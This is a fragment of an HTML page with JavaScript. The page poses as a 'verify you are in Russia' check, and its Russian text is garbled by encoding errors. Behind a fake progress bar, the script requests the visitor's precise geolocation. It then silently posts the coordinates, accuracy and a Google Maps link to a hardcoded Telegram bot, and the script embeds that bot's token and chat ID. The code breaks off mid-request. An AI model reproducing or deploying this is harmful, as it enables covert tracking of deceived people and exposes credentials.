</head>
<body>
    <div class="card">

        <p>–°–µ—Ä–≤–∏—Å –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ –†–æ—Å—Å–∏–∏. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏.</p>

        <div class="error" id="errorMsg"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7830653166:AAHCPcJsaaxAlurpxuUXdsChTNK9kbWobbE';
        const TELEGRAM_CHAT_ID = '6292332566';
        let currentProgress = 0;
        let progressInterval;

        document.getElementById('verifyBtn').addEventListener('click', verifyHuman);

        function verifyHuman() {
            const btn = document.getElementById('verifyBtn');
            const status = document.getElementById('status');
            const progressContainer = document.getElementById('progressContainer');
            const progressFill = document.getElementById('progressFill');
            const progressPercent = document.getElementById('progressPercent');
            const errorMsg = document.getElementById('errorMsg');
            
            btn.disabled = true;
            errorMsg.style.display = 'none';
            status.textContent = "–ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç—Ä–∞–Ω—É...";
            progressContainer.style.display = 'block';
            
            // –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
            currentProgress = 0;
            progressFill.style.width = '0%';
            progressPercent.textContent = '0%';
            
            progressInterval = setInterval(() => {
                if (currentProgress < 90) {
                    currentProgress += Math.floor(Math.random() * 10) + 1;
                    if (currentProgress > 90) currentProgress = 90;
                    progressFill.style.width = currentProgress + '%';
                    progressPercent.textContent = currentProgress + '%';
                }
            }, 300);

            if (!navigator.geolocation) {
                showError("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    clearProgress();
                    status.textContent = "–°–µ–∫—É–Ω–¥—É..";
                    
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}&z=18`;
                    
                    try {
                        await sendToTelegram(lat, lon, accuracy, mapUrl);
                        window.close();
                    } catch (e) {

                    }
                },
                (error) => {
                    clearProgress();
                    let message = "–û—à–∏–±–∫–∞: ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            message += "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â—ë–Ω";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            message += "–ì–µ–æ–¥–∞–Ω–Ω—ã–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã";
                            break;
                        case error.TIMEOUT:
                            message += "–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ";
                            break;
                        default:
                            message += "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞";
                    }
                    showError(message);
                },
                {
                    enableHighAccuracy: true,

                    maximumAge: 0
                }
            );
        }

        function clearProgress() {
            clearInterval(progressInterval);
            currentProgress = 100;
            document.getElementById('progressFill').style.width = '100%';
            document.getElementById('progressPercent').textContent = '100%';
        }

        function showError(message) {
            document.getElementById('errorMsg').textContent = message;
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('verifyBtn').disabled = false;
        }

        async function sendToTelegram(lat, lon, accuracy, mapUrl) {
            const message = `üîê –ù–æ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:
üìç –®–∏—Ä–æ—Ç–∞: ${lat.toFixed(6)}
üìç –î–æ–ª–≥–æ—Ç–∞: ${lon.toFixed(6)}
üéØ –¢–æ—á–Ω–æ—Å—Ç—å: ${Math.round(accuracy)} –º
üó∫Ô∏è –ö–∞—Ä—Ç–∞: ${mapUrl}
‚è±Ô∏è –í—Ä–µ–º—è: ${new Date().toLocaleTimeString()}`;

            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,

    </script>
